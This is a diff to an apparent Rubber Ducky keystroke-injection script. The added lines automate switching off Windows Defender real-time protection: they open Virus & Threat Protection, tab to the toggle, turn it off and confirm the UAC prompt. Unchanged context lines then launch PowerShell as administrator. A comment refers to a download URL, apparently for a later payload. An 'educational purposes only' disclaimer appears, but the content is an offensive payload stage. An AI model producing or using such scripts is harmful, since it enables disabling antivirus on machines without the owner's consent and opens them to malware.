@@ -10,7 +10,26 @@ REM Some editing on your part for download url
 REM This script is for educational purposes only
 
 REM Delay To Enumerate Ducky
-DELAY 3000
+Delay 2000
+REM Disable WinDefend
+Gui
+Delay 300
+String Virus & Threat Protection
+Delay 300
+Enter 
+Delay 3000
+Tab
+Tab
+Tab
+Tab
+Delay 300
+Enter
+Delay 300
+Space
+Delay 500
+Alt + Y
+Delay 500
+Alt + F4
 REM Launch Powershell As Admin
 GUI
 STRING powershell
